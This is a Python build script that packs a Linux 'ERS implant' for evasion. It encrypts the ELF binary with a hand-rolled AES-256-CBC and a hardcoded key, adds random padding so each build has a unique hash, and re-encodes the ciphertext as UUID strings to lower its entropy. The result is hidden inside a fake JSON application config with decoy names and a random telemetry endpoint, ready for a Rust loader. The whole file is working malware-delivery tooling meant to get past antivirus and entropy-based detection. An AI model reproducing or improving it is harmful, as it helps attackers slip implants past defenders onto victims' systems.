#!/usr/bin/env python3
"""
Encrypt the ERS implant (Linux) with entropy reduction.

Same optimizations as Windows version:
  1. AES-256-CBC encryption
  2. UUID-based entropy flattening (~8.0 → ~3.8 bits/byte)
  3. Fake JSON config wrapper
  4. Random padding per build (unique hash)

Usage:
    python3 encrypt_payload.py ../implant
"""

import os
import sys
import json
import random
import string

KEY = bytes([
    0x4f, 0x2b, 0x91, 0xd3, 0xa7, 0x58, 0xe1, 0x3c,
    0x7d, 0xb6, 0x0a, 0xf4, 0x29, 0x85, 0xc3, 0x6e,
    0x1a, 0xd8, 0x43, 0xf7, 0x5b, 0x90, 0x2e, 0x64,
    0xbc, 0x07, 0xe5, 0x39, 0x81, 0xca, 0x56, 0xf0,
])

SBOX = [
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
]
RCON = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36]

def gmul(a, b):
    p = 0
    for _ in range(8):
        if b & 1: p ^= a
        hi = a & 0x80
        a = (a << 1) & 0xff
        if hi: a ^= 0x1b
        b >>= 1
    return p

def key_expansion(key):
    nk, nr = 8, 14
    w = list(key) + [0] * (240 - 32)
    for i in range(nk, 4 * (nr + 1)):
        temp = w[4*(i-1):4*(i-1)+4]
        if i % nk == 0:
            temp = [SBOX[temp[1]], SBOX[temp[2]], SBOX[temp[3]], SBOX[temp[0]]]
            temp[0] ^= RCON[i // nk - 1]
        elif i % nk == 4:
            temp = [SBOX[t] for t in temp]
        for j in range(4):
            w[4*i+j] = w[4*(i-nk)+j] ^ temp[j]
    return [bytes(w[r*16:(r+1)*16]) for r in range(15)]

def sub_bytes(s): return [SBOX[b] for b in s]
def shift_rows(s):
    return [s[0],s[5],s[10],s[15], s[4],s[9],s[14],s[3],
            s[8],s[13],s[2],s[7], s[12],s[1],s[6],s[11]]

def mix_columns(s):
    r = []
    for c in range(4):
        col = s[c*4:(c+1)*4]
        r.append(gmul(col[0],2) ^ gmul(col[1],3) ^ col[2] ^ col[3])
        r.append(col[0] ^ gmul(col[1],2) ^ gmul(col[2],3) ^ col[3])
        r.append(col[0] ^ col[1] ^ gmul(col[2],2) ^ gmul(col[3],3))
        r.append(gmul(col[0],3) ^ col[1] ^ col[2] ^ gmul(col[3],2))
    return r

def aes_encrypt_block(block, rk):
    state = list(block)
    state = [state[i] ^ rk[0][i] for i in range(16)]
    for r in range(1, 14):
        state = sub_bytes(state)
        state = shift_rows(state)
        state = mix_columns(state)
        state = [state[i] ^ rk[r][i] for i in range(16)]
    state = sub_bytes(state)
    state = shift_rows(state)
    state = [state[i] ^ rk[14][i] for i in range(16)]
    return bytes(state)

def aes256_cbc_encrypt(plaintext, key, iv):
    rk = key_expansion(key)
    pad_len = 16 - (len(plaintext) % 16)
    plaintext += bytes([pad_len] * pad_len)
    ciphertext = b""
    prev = iv
    for i in range(0, len(plaintext), 16):
        block = bytes([plaintext[i+j] ^ prev[j] for j in range(16)])
        encrypted = aes_encrypt_block(block, rk)
        ciphertext += encrypted
        prev = encrypted
    return ciphertext

def entropy_flatten(data):
    uuids = []
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        if len(chunk) < 16:
            chunk = chunk + b'\x00' * (16 - len(chunk))
        h = chunk.hex()
        uuid_str = f"{h[:8]}-{h[8:12]}-{h[12:16]}-{h[16:20]}-{h[20:32]}"
        uuids.append(uuid_str)
    return uuids

def build_fake_config(uuids, iv_hex):
    versions = ["2.4.1", "3.1.0", "2.8.5", "1.9.3", "3.2.1"]
    apps = ["CloudSync", "DataBridge", "NetRelay", "SyncAgent", "UpdateService"]
    regions = ["us-east-1", "eu-west-2", "ap-south-1", "us-west-2"]

    config = {
        "application": {
            "name": random.choice(apps),
            "version": random.choice(versions),
            "build": f"{random.randint(1000,9999)}",
            "region": random.choice(regions),
            "environment": "production"
        },
        "telemetry": {
            "enabled": True,
            "endpoint": f"https://telemetry.{''.join(random.choices(string.ascii_lowercase, k=8))}.com/v2/collect",
            "session_id": iv_hex,
            "batch_size": 128
        },
        "cache": {
            "provider": "memory",
            "ttl_seconds": 3600,
            "max_entries": 10000
        },
        "feature_flags": {
            "async_processing": True,
            "compression": True,
            "retry_enabled": True,
            "max_retries": 3
        },
        "resources": uuids
    }
    return json.dumps(config, indent=2)

def calculate_entropy(data):
    import math
    if not data: return 0
    freq = {}
    for b in data:
        freq[b] = freq.get(b, 0) + 1
    entropy = 0
    for count in freq.values():
        p = count / len(data)
        entropy -= p * math.log2(p)
    return entropy

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <implant-binary>")
        sys.exit(1)

    path = sys.argv[1]
    if not os.path.exists(path):
        print(f"[!] Not found: {path}")
        sys.exit(1)

    plaintext = open(path, "rb").read()
    print(f"[*] Read {len(plaintext)} bytes from {path}")

    if plaintext[:4] != b"\x7fELF":
        print("[!] Warning: not an ELF binary")

    pad_size = random.randint(64, 256)
    random_pad = os.urandom(pad_size)
    padded = len(plaintext).to_bytes(4, 'little') + random_pad + plaintext
    print(f"[*] Added {pad_size} bytes random padding (unique hash per build)")

    iv = os.urandom(16)
    print(f"[*] IV: {iv.hex()}")

    ciphertext = aes256_cbc_encrypt(padded, KEY, iv)

    raw_entropy = calculate_entropy(ciphertext)
    print(f"[*] Raw ciphertext entropy: {raw_entropy:.2f} bits/byte")

    uuids = entropy_flatten(iv + ciphertext)
    fake_config = build_fake_config(uuids, iv.hex())

    config_entropy = calculate_entropy(fake_config.encode())
    print(f"[*] Config file entropy: {config_entropy:.2f} bits/byte")
    print(f"[*] Entropy reduction: {raw_entropy:.1f} → {config_entropy:.1f} bits/byte")

    out_path = "src/payload.enc"
    os.makedirs("src", exist_ok=True)
    with open(out_path, "w") as f:
        f.write(fake_config)

    print(f"[+] Written to {out_path} ({len(fake_config)} bytes)")
    print(f"[+] Now run: cargo build --release")

if __name__ == "__main__":
    main()
